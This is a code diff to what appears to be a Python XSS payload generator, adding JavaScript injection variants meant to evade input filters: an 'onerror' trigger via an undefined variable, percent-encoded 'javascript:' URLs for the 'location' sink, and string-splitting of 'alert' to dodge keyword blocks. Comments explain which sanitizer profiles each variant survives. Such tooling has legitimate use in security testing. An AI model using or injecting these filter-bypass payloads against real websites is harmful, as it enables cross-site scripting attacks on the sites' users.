@@ -152,6 +152,15 @@ def _throw_forms(
             f"throw/**/onerror={fn_expr},1",
             f"throw-0,onerror={fn_expr},1",
         ]
+    # ReferenceError trigger: evaluating an undefined identifier raises an
+    # uncaught exception that routes to `self.onerror`. Needs only `=`, `,`,
+    # `.` — survives profiles that strip `throw`, `-`, `/`, and spaces alike.
+    if (
+        kw.get("comma") is not False
+        and kw.get("eq") is not False
+        and kw.get("dot") is not False
+    ):
+        comma_forms.append(f"self.onerror={fn_expr},undefined_variable")
 
     if not semi_ok and not braces_ok:
         return comma_forms
@@ -356,6 +365,11 @@ def noparens_funcs(
       1. `{onerror=alert}throw 1` / `{onerror=alert}throw-1` (block statement, 0 `;` and 0 `()`)
       2. `throw onerror=alert,1` (comma expression inside `throw`, 0 `;`, 0 `{}`, 0 `()`)
       3. `location='javascript:alert\\x281\\x29'` (hex-escaped parens inside navigation sink)
+      4. `location='javascript:alert%281%29'` (percent-encoded parens — survives
+         backslash-doubling filters that kill `\\x28`)
+      5. All dialog names blocked: `location='javascript:%61lert%281%29'`
+         (percent-encoded name+parens) and `location='javascript:al'+'ert%281%29'`
+         (bare string-concat name mask — deterministic under re-run filters)
     """
     parens_ok = kw.get("parentheses", True) and kw.get("gen_call", True)
     btick_ok = kw.get("backtick", True) and kw.get("gen_tick", True)
@@ -379,18 +393,41 @@ def noparens_funcs(
         else:
             out.append(f"throw/**/onerror={name},1")
             out.append(f"throw-0,onerror={name},1")
+        if (
+            kw.get("comma") is not False
+            and kw.get("eq") is not False
+            and kw.get("dot") is not False
+        ):
+            out.append(f"self.onerror={name},undefined_variable")
 
     if kw.get("javascript_proto", True):
+        # `%` survives only if percent sequences pass through unmangled —
+        # `double_url_lt` (`%3c`) is the probe for that. When a filter
+        # re-encodes (`%`->`%25`) or strips (`%25`->``) percent sequences,
+        # the %28/%61 channels die and must not be emitted.
+        pct_ok = kw.get("double_url_lt", True)
         for q in quotes:
             for name in DIALOG_FUNCS:
                 if kw.get(name, True):
                     arg_hex = "\\x28\\x29" if name == "print" else "\\x281\\x29"
                     out.append(f"location={q}javascript:{name}{arg_hex}{q}")
+                    if pct_ok:
+                        arg_pct = "%28%29" if name == "print" else "%281%29"
+                        out.append(
+                            f"location={q}javascript:{name}{arg_pct}{q}"
+                        )
                     break
             else:
                 out.append(
                     f"location={q}javascript:\\x61lert\\x281\\x29{q}"
                 )
+                if pct_ok:
+                    out.append(
+                        f"location={q}javascript:%61lert%281%29{q}"
+                    )
+                    out.append(
+                        f'location={q}javascript:al{q}+{q}ert%281%29{q}'
+                    )
 
     return out
 
